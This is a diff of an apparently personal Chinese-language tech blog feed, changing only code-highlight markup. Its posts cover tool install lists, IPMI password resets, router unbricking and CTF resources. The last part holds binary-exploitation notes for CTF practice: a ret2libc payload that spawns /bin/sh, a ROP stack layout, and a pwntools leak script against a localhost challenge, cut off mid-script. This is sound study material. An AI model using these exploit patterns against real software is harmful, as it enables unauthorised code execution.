@@ -42,62 +42,62 @@ WF-1000XM4 帶起來滿吃耳朵輪廓的，就我而言 Airpods Pro 比較舒�
       <description>紀錄一下安裝清單
 scoop 是一套 windows 下的 installer，有點像是 MacOS 下的 brew 以 powershell 當做後端
 也有許多 buckets 可以加入
-scoop bucket add nerd-fonts scoop bucket add extras 7zip 21.07 [main] ag 2.2.5 [main] anydesk 7.0.4 [extras] aria2 1.36.0-1 [main] bat 0.19.0 [main] cacert 2021-10-26 [main] cmake 3.22.1 [main] croc 9.5.0 [main] curl 7.81.0 [main] dark 3.11.2 [main] draw.io 16.0.0 [extras] DroidSansMono-NF 2.1.0 [nerd-fonts] file 5.38 [main] FiraCode 6.2 [nerd-fonts] firefox 95.0.2 [extras] git 2.34.1.windows.1 [main] hashcheck 2.</description>
+scoop bucket add nerd-fonts scoop bucket add extras  7zip 21.07 [main]  ag 2.2.5 [main]  anydesk 7.0.4 [extras]  aria2 1.36.0-1 [main]  bat 0.19.0 [main]  cacert 2021-10-26 [main]  cmake 3.22.1 [main]  croc 9.5.0 [main]  curl 7.81.0 [main]  dark 3.11.2 [main]  draw.io 16.0.0 [extras]  DroidSansMono-NF 2.1.0 [nerd-fonts]  file 5.</description>
       <content:encoded><![CDATA[<p>紀錄一下安裝清單</p>
 <p><a href="https://scoop.sh/">scoop</a> 是一套 windows 下的 installer，有點像是 MacOS 下的 <code>brew</code>
 以 powershell 當做後端</p>
 <p>也有許多 <a href="https://github.com/ScoopInstaller/Scoop#known-application-buckets">buckets</a> 可以加入</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">scoop bucket add nerd-fonts
-scoop bucket add extras
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">  7zip 21.07 [main]
-  ag 2.2.5 [main]
-  anydesk 7.0.4 [extras]
-  aria2 1.36.0-1 [main]
-  bat 0.19.0 [main]
-  cacert 2021-10-26 [main]
-  cmake 3.22.1 [main]
-  croc 9.5.0 [main]
-  curl 7.81.0 [main]
-  dark 3.11.2 [main]
-  draw.io 16.0.0 [extras]
-  DroidSansMono-NF 2.1.0 [nerd-fonts]
-  file 5.38 [main]
-  FiraCode 6.2 [nerd-fonts]
-  firefox 95.0.2 [extras]
-  git 2.34.1.windows.1 [main]
-  hashcheck 2.4.0 [extras]
-  hugo 0.91.2 [main]
-  keepassxc 2.6.6 [extras]
-  lessmsi 1.10.0 [main]
-  llvm 13.0.0 [main]
-  make 4.3 [main]
-  mattermost 5.0.2 [extras]
-  Meslo-NF 2.1.0 [nerd-fonts]
-  netcat 1.12 [main]
-  obs-studio 27.1.3 [extras]
-  posh-git 1.0.0 [extras]
-  processhacker 2.39 [extras]
-  python 3.10.1 [main]
-  rufus 3.17 [extras]
-  SourceCodePro-NF 2.1.0 [nerd-fonts]
-  speedtest-cli 1.1.1 [main]
-  sqlitebrowser 3.12.2 [extras]
-  sudo 0.2020.01.26 [main]
-  sysinternals 2021.October.26 [extras]
-  teamviewer 15.24.5 [extras]
-  telegram 3.3.0 [extras]
-  Ubuntu-NF 2.1.0 [nerd-fonts]
-  UbuntuMono-NF 2.1.0 [nerd-fonts]
-  vim 8.2.2824 [main]
-  vlc 3.0.16 [extras]
-  vscode 1.63.2 [extras]
-  wget 1.21.2 [main]
-  winbox 3.31 [extras]
-  winscp 5.19.5 [extras]
-  x64dbg 2021-12-05_15-32 [extras]
-  xmake 2.6.2 [main]
-  yara 4.1.3-1755 [main]
-</code></pre></div>]]></content:encoded>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>scoop bucket add nerd-fonts
+</span></span><span style="display:flex;"><span>scoop bucket add extras
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  7zip 21.07 [main]
+</span></span><span style="display:flex;"><span>  ag 2.2.5 [main]
+</span></span><span style="display:flex;"><span>  anydesk 7.0.4 [extras]
+</span></span><span style="display:flex;"><span>  aria2 1.36.0-1 [main]
+</span></span><span style="display:flex;"><span>  bat 0.19.0 [main]
+</span></span><span style="display:flex;"><span>  cacert 2021-10-26 [main]
+</span></span><span style="display:flex;"><span>  cmake 3.22.1 [main]
+</span></span><span style="display:flex;"><span>  croc 9.5.0 [main]
+</span></span><span style="display:flex;"><span>  curl 7.81.0 [main]
+</span></span><span style="display:flex;"><span>  dark 3.11.2 [main]
+</span></span><span style="display:flex;"><span>  draw.io 16.0.0 [extras]
+</span></span><span style="display:flex;"><span>  DroidSansMono-NF 2.1.0 [nerd-fonts]
+</span></span><span style="display:flex;"><span>  file 5.38 [main]
+</span></span><span style="display:flex;"><span>  FiraCode 6.2 [nerd-fonts]
+</span></span><span style="display:flex;"><span>  firefox 95.0.2 [extras]
+</span></span><span style="display:flex;"><span>  git 2.34.1.windows.1 [main]
+</span></span><span style="display:flex;"><span>  hashcheck 2.4.0 [extras]
+</span></span><span style="display:flex;"><span>  hugo 0.91.2 [main]
+</span></span><span style="display:flex;"><span>  keepassxc 2.6.6 [extras]
+</span></span><span style="display:flex;"><span>  lessmsi 1.10.0 [main]
+</span></span><span style="display:flex;"><span>  llvm 13.0.0 [main]
+</span></span><span style="display:flex;"><span>  make 4.3 [main]
+</span></span><span style="display:flex;"><span>  mattermost 5.0.2 [extras]
+</span></span><span style="display:flex;"><span>  Meslo-NF 2.1.0 [nerd-fonts]
+</span></span><span style="display:flex;"><span>  netcat 1.12 [main]
+</span></span><span style="display:flex;"><span>  obs-studio 27.1.3 [extras]
+</span></span><span style="display:flex;"><span>  posh-git 1.0.0 [extras]
+</span></span><span style="display:flex;"><span>  processhacker 2.39 [extras]
+</span></span><span style="display:flex;"><span>  python 3.10.1 [main]
+</span></span><span style="display:flex;"><span>  rufus 3.17 [extras]
+</span></span><span style="display:flex;"><span>  SourceCodePro-NF 2.1.0 [nerd-fonts]
+</span></span><span style="display:flex;"><span>  speedtest-cli 1.1.1 [main]
+</span></span><span style="display:flex;"><span>  sqlitebrowser 3.12.2 [extras]
+</span></span><span style="display:flex;"><span>  sudo 0.2020.01.26 [main]
+</span></span><span style="display:flex;"><span>  sysinternals 2021.October.26 [extras]
+</span></span><span style="display:flex;"><span>  teamviewer 15.24.5 [extras]
+</span></span><span style="display:flex;"><span>  telegram 3.3.0 [extras]
+</span></span><span style="display:flex;"><span>  Ubuntu-NF 2.1.0 [nerd-fonts]
+</span></span><span style="display:flex;"><span>  UbuntuMono-NF 2.1.0 [nerd-fonts]
+</span></span><span style="display:flex;"><span>  vim 8.2.2824 [main]
+</span></span><span style="display:flex;"><span>  vlc 3.0.16 [extras]
+</span></span><span style="display:flex;"><span>  vscode 1.63.2 [extras]
+</span></span><span style="display:flex;"><span>  wget 1.21.2 [main]
+</span></span><span style="display:flex;"><span>  winbox 3.31 [extras]
+</span></span><span style="display:flex;"><span>  winscp 5.19.5 [extras]
+</span></span><span style="display:flex;"><span>  x64dbg 2021-12-05_15-32 [extras]
+</span></span><span style="display:flex;"><span>  xmake 2.6.2 [main]
+</span></span><span style="display:flex;"><span>  yara 4.1.3-1755 [main]
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -109,24 +109,24 @@ scoop bucket add extras
       <description>因為在網路上買了一片 ASRock 的二手 server 主機板，想用 IPMI 的功能，不過密碼已經被改過了，所以上網找一下有沒有可以 reset 的方法
 首先可以用個隨便 windows 開機，下載 supermicro 的工具 IPMICFG
 https://www.supermicro.com/SwDownload/SwSelect_Free.aspx?cat=IPMI
-ipmicfg -user list Maximum number of Users : 10 Count of currently enabled Users : 1 User ID | User Name | Privilege Level | Enable --------|-----------|-----------------|------- 2 | admin | Administrator | Yes ipmicfg -user setpwd 2 admin 或是回到原廠設定
+ipmicfg -user list  Maximum number of Users : 10 Count of currently enabled Users : 1 User ID | User Name | Privilege Level | Enable --------|-----------|-----------------|------- 2 | admin | Administrator | Yes  ipmicfg -user setpwd 2 admin 或是回到原廠設定
 ipmicfg -fd ref
  https://blog.kingj.net/2014/03/15/how-to/resetting-the-ipmi-password-on-the-e3c224d2i/ https://support.siliconmechanics.com/portal/en/kb/articles/resetting-the-bmc</description>
       <content:encoded><![CDATA[<p>因為在網路上買了一片 ASRock 的二手 server 主機板，想用 IPMI 的功能，不過密碼已經被改過了，所以上網找一下有沒有可以 reset 的方法</p>
 <p>首先可以用個隨便 windows 開機，下載 supermicro 的工具 IPMICFG</p>
 <p><a href="https://www.supermicro.com/SwDownload/SwSelect_Free.aspx?cat=IPMI">https://www.supermicro.com/SwDownload/SwSelect_Free.aspx?cat=IPMI</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ipmicfg -user list
-
-Maximum number of Users          : 10
-Count of currently enabled Users : 1
-User ID | User Name | Privilege Level | Enable
---------|-----------|-----------------|-------
-2       | admin     | Administrator   | Yes
-
-ipmicfg -user setpwd 2 admin
-</code></pre></div><p>或是回到原廠設定</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ipmicfg -fd
-</code></pre></div><p>ref</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ipmicfg -user list
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Maximum number of Users          : 10
+</span></span><span style="display:flex;"><span>Count of currently enabled Users : 1
+</span></span><span style="display:flex;"><span>User ID | User Name | Privilege Level | Enable
+</span></span><span style="display:flex;"><span>--------|-----------|-----------------|-------
+</span></span><span style="display:flex;"><span>2       | admin     | Administrator   | Yes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ipmicfg -user setpwd 2 admin
+</span></span></code></pre></div><p>或是回到原廠設定</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ipmicfg -fd
+</span></span></code></pre></div><p>ref</p>
 <hr>
 <p><a href="https://blog.kingj.net/2014/03/15/how-to/resetting-the-ipmi-password-on-the-e3c224d2i/">https://blog.kingj.net/2014/03/15/how-to/resetting-the-ipmi-password-on-the-e3c224d2i/</a>
 <a href="https://support.siliconmechanics.com/portal/en/kb/articles/resetting-the-bmc">https://support.siliconmechanics.com/portal/en/kb/articles/resetting-the-bmc</a></p>
@@ -143,19 +143,19 @@ ipmicfg -user setpwd 2 admin
 使用 Putty 連接 FT232 的 COM Port，至於Router板子上面的腳位可以透過 DD-WRT 或是 Open-WRT 中的 Wiki，幾乎很多路由器都有可以參考的資料。
 例如：https://wiki.openwrt.org/toh/d-link/dir-300revb
 接上以後會出現以下選單，手速要快一點，選擇 &amp;ldquo;2&amp;rdquo; 可以連接到電腦架設的 TFTP Server 抓取韌體並重刷。
-Please choose the operation: 1: Load system code to SDRAM via TFTP. 2: Load system code then write to Flash via TFTP. 3: Boot system code via Flash (default). 4: Entr boot command line interface. 7: Load Boot Loader code then write to Flash via Serial.</description>
+ Please choose the operation:  1: Load system code to SDRAM via TFTP.  2: Load system code then write to Flash via TFTP.  3: Boot system code via Flash (default).  4: Entr boot command line interface.</description>
       <content:encoded><![CDATA[<p>之前刷 Router 的時候不小心把它刷爆了，變成磚，可以透過 FT232 工具把 Router 的殼拆掉，對接上面的 RS232，其中 GND, TX, RX 接到電腦可以直接下 command，也可以執行 system shell。</p>
 <p>使用 Putty 連接 FT232 的 COM Port，至於Router板子上面的腳位可以透過 DD-WRT 或是 Open-WRT 中的 Wiki，幾乎很多路由器都有可以參考的資料。</p>
 <p>例如：<a href="https://wiki.openwrt.org/toh/d-link/dir-300revb">https://wiki.openwrt.org/toh/d-link/dir-300revb</a></p>
 <p>接上以後會出現以下選單，手速要快一點，選擇 &ldquo;2&rdquo; 可以連接到電腦架設的 TFTP Server 抓取韌體並重刷。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">   Please choose the operation:
-   1: Load system code to SDRAM via TFTP.
-   2: Load system code then write to Flash via TFTP.
-   3: Boot system code via Flash (default).
-   4: Entr boot command line interface.
-   7: Load Boot Loader code then write to Flash via Serial.
-   9: Load Boot Loader code then write to Flash via TFTP.
-</code></pre></div><p>電腦設定固定 ip，然後網路線連到 Router，輸入電腦 ip 與韌體的檔名就好了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>   Please choose the operation:
+</span></span><span style="display:flex;"><span>   1: Load system code to SDRAM via TFTP.
+</span></span><span style="display:flex;"><span>   2: Load system code then write to Flash via TFTP.
+</span></span><span style="display:flex;"><span>   3: Boot system code via Flash (default).
+</span></span><span style="display:flex;"><span>   4: Entr boot command line interface.
+</span></span><span style="display:flex;"><span>   7: Load Boot Loader code then write to Flash via Serial.
+</span></span><span style="display:flex;"><span>   9: Load Boot Loader code then write to Flash via TFTP.
+</span></span></code></pre></div><p>電腦設定固定 ip，然後網路線連到 Router，輸入電腦 ip 與韌體的檔名就好了。</p>
 ]]></content:encoded>
     </item>
     
@@ -166,57 +166,57 @@ Please choose the operation: 1: Load system code to SDRAM via TFTP. 2: Load syst
       
       <guid>https://blog.zet.tw/posts/2018-01-09-how-to-pwnable/</guid>
       <description>陸續更新～
-website, doc and video https://ctf-wiki.github.io/ctf-wiki LiveOverflow youtube channel https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w http://liveoverflow.com/binary_hacking/protostar/index.html Heap 手法整理 https://github.com/shellphish/how2heap 日本選手的一系列投影片 http://www.slideshare.net/bata_24/presentations 杨坤：掘金CTF ——CTF中的内存漏洞利用技巧 http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf Modern Binary Exploitation by RPISEC http://security.cs.rpi.edu/courses/binexp-spring2015/ https://github.com/RPISEC/MBE https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn inaz2 整理的 exploit 手法 http://inaz2.hatenablog.com/archive/category/Exploit?page=1 http://inaz2.hatenablog.com/archive/category/Exploit?page=2 http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf https://github.com/str4tan/pwning Heap: https://github.com/cloudburst/libheap https://github.com/DhavalKapil/libdheap https://github.com/degrigis/Heapy https://github.com/shellphish/how2heap wargame and ctf https://pwnable.tw/ http://pwnable.kr/ https://bamboofox.cs.nctu.edu.tw/ http://overthewire.org/wargames/ https://w3challs.com/ https://exploit-exercises.com/nebula/ http://ctf.katsudon.org/ http://ctf.katsudon.org/ctf4u/ tools debug
+website, doc and video https://ctf-wiki.github.io/ctf-wiki  LiveOverflow youtube channel https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w http://liveoverflow.com/binary_hacking/protostar/index.html  Heap 手法整理 https://github.com/shellphish/how2heap  日本選手的一系列投影片 http://www.slideshare.net/bata_24/presentations  杨坤：掘金CTF ——CTF中的内存漏洞利用技巧 http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf  Modern Binary Exploitation by RPISEC http://security.cs.rpi.edu/courses/binexp-spring2015/ https://github.com/RPISEC/MBE  https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn  inaz2 整理的 exploit 手法 http://inaz2.hatenablog.com/archive/category/Exploit?page=1 http://inaz2.hatenablog.com/archive/category/Exploit?page=2  http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf  https://github.com/str4tan/pwning  Heap: https://github.com/cloudburst/libheap https://github.com/DhavalKapil/libdheap https://github.com/degrigis/Heapy https://github.com/shellphish/how2heap wargame and ctf https://pwnable.tw/ http://pwnable.kr/ https://bamboofox.cs.nctu.edu.tw/ http://overthewire.org/wargames/ https://w3challs.com/ https://exploit-exercises.com/nebula/ http://ctf.katsudon.org/ http://ctf.katsudon.org/ctf4u/ tools debug
 https://github.com/snare/voltron </description>
       <content:encoded><![CDATA[<p>陸續更新～</p>
 <h2 id="website-doc-and-video">website, doc and video</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://ctf-wiki.github.io/ctf-wiki
-
-LiveOverflow youtube channel
-https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w
-http://liveoverflow.com/binary_hacking/protostar/index.html
-
-Heap 手法整理
-https://github.com/shellphish/how2heap
-
-日本選手的一系列投影片
-http://www.slideshare.net/bata_24/presentations
-
-杨坤：掘金CTF ——CTF中的内存漏洞利用技巧
-http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf
-
-Modern Binary Exploitation by RPISEC
-http://security.cs.rpi.edu/courses/binexp-spring2015/
-https://github.com/RPISEC/MBE
-
-https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn
-
-inaz2 整理的 exploit 手法
-http://inaz2.hatenablog.com/archive/category/Exploit?page=1
-http://inaz2.hatenablog.com/archive/category/Exploit?page=2
-
-http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf
-
-https://github.com/str4tan/pwning
-
-Heap:
-https://github.com/cloudburst/libheap
-https://github.com/DhavalKapil/libdheap
-https://github.com/degrigis/Heapy
-https://github.com/shellphish/how2heap
-</code></pre></div><h2 id="wargame-and-ctf">wargame and ctf</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://pwnable.tw/
-http://pwnable.kr/
-https://bamboofox.cs.nctu.edu.tw/
-http://overthewire.org/wargames/
-https://w3challs.com/
-https://exploit-exercises.com/nebula/
-http://ctf.katsudon.org/
-http://ctf.katsudon.org/ctf4u/
-</code></pre></div><h2 id="tools">tools</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://ctf-wiki.github.io/ctf-wiki
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>LiveOverflow youtube channel
+</span></span><span style="display:flex;"><span>https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w
+</span></span><span style="display:flex;"><span>http://liveoverflow.com/binary_hacking/protostar/index.html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Heap 手法整理
+</span></span><span style="display:flex;"><span>https://github.com/shellphish/how2heap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>日本選手的一系列投影片
+</span></span><span style="display:flex;"><span>http://www.slideshare.net/bata_24/presentations
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>杨坤：掘金CTF ——CTF中的内存漏洞利用技巧
+</span></span><span style="display:flex;"><span>http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Modern Binary Exploitation by RPISEC
+</span></span><span style="display:flex;"><span>http://security.cs.rpi.edu/courses/binexp-spring2015/
+</span></span><span style="display:flex;"><span>https://github.com/RPISEC/MBE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>inaz2 整理的 exploit 手法
+</span></span><span style="display:flex;"><span>http://inaz2.hatenablog.com/archive/category/Exploit?page=1
+</span></span><span style="display:flex;"><span>http://inaz2.hatenablog.com/archive/category/Exploit?page=2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>https://github.com/str4tan/pwning
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Heap:
+</span></span><span style="display:flex;"><span>https://github.com/cloudburst/libheap
+</span></span><span style="display:flex;"><span>https://github.com/DhavalKapil/libdheap
+</span></span><span style="display:flex;"><span>https://github.com/degrigis/Heapy
+</span></span><span style="display:flex;"><span>https://github.com/shellphish/how2heap
+</span></span></code></pre></div><h2 id="wargame-and-ctf">wargame and ctf</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://pwnable.tw/
+</span></span><span style="display:flex;"><span>http://pwnable.kr/
+</span></span><span style="display:flex;"><span>https://bamboofox.cs.nctu.edu.tw/
+</span></span><span style="display:flex;"><span>http://overthewire.org/wargames/
+</span></span><span style="display:flex;"><span>https://w3challs.com/
+</span></span><span style="display:flex;"><span>https://exploit-exercises.com/nebula/
+</span></span><span style="display:flex;"><span>http://ctf.katsudon.org/
+</span></span><span style="display:flex;"><span>http://ctf.katsudon.org/ctf4u/
+</span></span></code></pre></div><h2 id="tools">tools</h2>
 <p><strong>debug</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://github.com/snare/voltron
-</code></pre></div>]]></content:encoded>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://github.com/snare/voltron
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -241,10 +241,10 @@ mb:asus N3150M-E ram:8G storage:120G SSD + 1T 鍵盤 ducky one 80% 茶軸，自�
 </ul>
 <h1 id="硬體">硬體</h1>
 <p>架了一台家裡的server，跑debian，總耗電瓦數不超過30瓦，非常省電CP值超高!!!，唯一覺得可惜的是，SATA接頭只有2個而且主機板沒有支援RAID的功能</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">mb:asus N3150M-E
-ram:8G
-storage:120G SSD + 1T
-</code></pre></div><h2 id="鍵盤">鍵盤</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>mb:asus N3150M-E
+</span></span><span style="display:flex;"><span>ram:8G
+</span></span><span style="display:flex;"><span>storage:120G SSD + 1T
+</span></span></code></pre></div><h2 id="鍵盤">鍵盤</h2>
 <p>ducky one 80% 茶軸，自己換了PBT鍵帽，PBT摸起來感覺有種粉粉的感覺，也買好清理的，高度Cherry原廠鍵帽的高度，剛開始是OEM不過用個幾天就習慣了</p>
 <h1 id="軟體">軟體</h1>
 <h2 id="flux---飽護眼睛">f.lux - 飽護眼睛</h2>
@@ -262,11 +262,11 @@ storage:120G SSD + 1T
 <pre><code>&lt;http://matthewpalmer.net/vanilla/&gt;
 </code></pre>
 <h1 id="services">services</h1>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">docker - nginx - php - ubuntu for pwnable
-avahi-daemon  (在區網中可以直接使用 hostname.local 登入)
-time-machine (硬碟格式需要注意一下，我是用ext4)
-samba
-</code></pre></div><p>在iterm下新增多個profile，搭配command <code>ssh user@192.168.xx.xx</code> ，使用ssh-key <code>cmd</code> + <code>o</code> ，開啟視窗直接選擇要登入的主機爽度大增</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>docker - nginx - php - ubuntu for pwnable
+</span></span><span style="display:flex;"><span>avahi-daemon  (在區網中可以直接使用 hostname.local 登入)
+</span></span><span style="display:flex;"><span>time-machine (硬碟格式需要注意一下，我是用ext4)
+</span></span><span style="display:flex;"><span>samba
+</span></span></code></pre></div><p>在iterm下新增多個profile，搭配command <code>ssh user@192.168.xx.xx</code> ，使用ssh-key <code>cmd</code> + <code>o</code> ，開啟視窗直接選擇要登入的主機爽度大增</p>
 <h2 id="pwnable">pwnable</h2>
 <p>用docker跑起來的，寫了shell script跟一般的dotfile 分離，有興趣可以看一下
 <a href="https://github.com/zet235/ctf-tools">https://github.com/zet235/ctf-tools</a></p>
@@ -309,60 +309,60 @@ read @ plt pop_pop_pop_ret 0 addr length system @ plt x86_64  最大地址 0x000
 <h3 id="ret2libc-疊法">Ret2libc 疊法</h3>
 <p>可以盡可能的把參數疊完整，比較不會發生一些鳥問題</p>
 <p>一般x86的疊法是：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">padding +  function + ret address + argv1 + argv2 + argv3 ....
-</code></pre></div><p>一般 function 可以直接跳 <code>.plt</code> ， ret address 是執行完以後我要去的地方，假如一般疊出 system(&quot;/bin/sh&quot;)，ret address 可以直接填空沒關係</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>padding +  function + ret address + argv1 + argv2 + argv3 ....
+</span></span></code></pre></div><p>一般 function 可以直接跳 <code>.plt</code> ， ret address 是執行完以後我要去的地方，假如一般疊出 system(&quot;/bin/sh&quot;)，ret address 可以直接填空沒關係</p>
 <p>例如 :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&#39;A&#39;*100 + p32(system_addr) + p32(0) + p32(binsh_addr)
-</code></pre></div><p>x64:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&#39;A&#39;*100 + p32(system_addr) + p32(0) + p32(binsh_addr)
+</span></span></code></pre></div><p>x64:
 利用一些 <code>pop reg</code> 的getgads把reg設定好</p>
 <h3 id="x32">x32</h3>
 <p>參數直接疊在stack上，用 pop_ret 清掉用過的參數</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">read @ plt
-pop_pop_pop_ret
-0
-addr
-length
-system @ plt
-</code></pre></div><h3 id="x86_64">x86_64</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>read @ plt
+</span></span><span style="display:flex;"><span>pop_pop_pop_ret
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>addr
+</span></span><span style="display:flex;"><span>length
+</span></span><span style="display:flex;"><span>system @ plt
+</span></span></code></pre></div><h3 id="x86_64">x86_64</h3>
 <ul>
 <li>最大地址 <code>0x00007fffffffffff</code></li>
 </ul>
 <h3 id="dynelf">DynELF</h3>
 <p>假如在不知道對方libc 的情況下可以使用pwntools中的一個工具<code>DynELF</code>，給他一個leak的點，可以幫你找出function的位置</p>
 <p>這是313c CTF 中的 cfy 可以當作練習</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> time
-
-printf_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x601020</span>
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(addr):
-    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>)
-    r<span style="color:#f92672">.</span>sendline(p64(addr) )
-    s <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#39;hex: 0x&#39;</span>)[<span style="color:#ae81ff">5</span>:]<span style="color:#f92672">.</span>strip()
-    s <span style="color:#f92672">=</span> p64( int(s,<span style="color:#ae81ff">16</span>) )
-    <span style="color:#66d9ef">return</span> s
-
-r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#ae81ff">4000</span>)
-
